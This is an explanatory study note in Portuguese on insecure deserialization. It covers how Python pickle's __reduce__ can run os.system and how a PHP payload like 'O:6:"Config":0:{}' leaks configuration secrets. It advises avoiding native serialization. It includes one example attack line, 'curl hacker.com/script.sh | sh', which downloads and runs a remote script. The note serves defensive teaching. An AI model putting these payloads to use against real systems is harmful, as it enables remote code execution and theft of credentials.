# Deep Explanation: Serialização em Backend

## O que é serialização e por que existe

Serialização é transformar um objeto em memória em dados persistíveis. JSON faz isso para tipos básicos (string, número, booleano, array, objeto). Mas linguagens como Python, PHP e Java têm formatos nativos que serializam **muito mais**: classes customizadas, variáveis em memória, objetos internos da linguagem, referências circulares, conexões.

O problema fundamental: **desserializar é executar código**. Quando o deserializador reconstrói um objeto, ele precisa:
- Instanciar a classe
- Restaurar estado (que pode incluir side effects)
- Executar métodos mágicos (`__reduce__`, `__wakeup__`, `__destruct__`)

## Vetor de ataque 1: Execução Remota de Código (Python/pickle)

O método `__reduce__` do Python diz ao pickle como reconstruir um objeto. Se retorna uma tupla `(função, argumentos)`, o pickle **executa essa função** durante a desserialização.

O instrutor demonstrou: uma classe maliciosa com `__reduce__` retornando `(os.system, ("comando shell",))`. Ao desserializar, o Python executa o comando. O atacante pode:
- `curl hacker.com/script.sh | sh` — download e execução de script remoto
- Takeover completo da máquina

O erro não dá no pickle.load — o código malicioso **já executou** antes do erro acontecer. Isso é crítico: mesmo que sua aplicação trate o erro, o dano já foi feito.

## Vetor de ataque 2: Vazamento de dados (PHP/unserialize)

O formato de serialização do PHP usa uma sintaxe textual:
- `a:3:{...}` — array de 3 elementos
- `s:6:"titulo"` — string de 6 caracteres
- `O:6:"Config":0:{}` — objeto da classe Config com 0 parâmetros

O instrutor mostrou: um atacante substitui um array serializado por `O:6:"Config":0:{}`. Quando o PHP desserializa, ele instancia a classe `Config` — que no framework lê variáveis de ambiente, conexão ao banco, chaves de API. O `foreach` do PHP trata propriedades públicas de objetos como arrays, então o atacante lê todas as configurações sensíveis.

A classe `Config` **não precisa ter nada a ver com a lógica de desserialização**. Basta existir no classpath/autoloader. Qualquer classe global é um alvo.

## Por que "só não use" é o melhor conselho

O instrutor foi direto: **não use serialização**. As razões são:

1. **Superfície de ataque invisível** — o risco não está no seu código, está em qualquer classe que exista no runtime
2. **Defesa é frágil** — allowlists ajudam mas não eliminam gadget chains
3. **Alternativas são melhores** — JSON, Protocol Buffers, MessagePack cobrem 99% dos casos
4. **O benefício não justifica o risco** — salvar um objeto complexo é conveniência, não necessidade

## Quando serialização é aceitável (único cenário)

Se você usa o pattern Prevayler (object prevalence) ou similar:
- A aplicação serializa E desserializa
- Os dados ficam no filesystem local do servidor
- Nenhum dado serializado vai para S3, banco, rede
- Nenhum dado serializado vem de fora da aplicação
- O ambiente é controlado e isolado

Mesmo assim: se o servidor for comprometido e o atacante modificar os arquivos de serialização, na próxima vez que a aplicação carregar, o código malicioso executa.

## Analogia do instrutor

Serialização nativa é como dar a chave da sua casa para o entregador guardar. JSON é como receber o pacote pela janelinha. O entregador (usuário/rede) nunca precisa entrar na sua casa (runtime).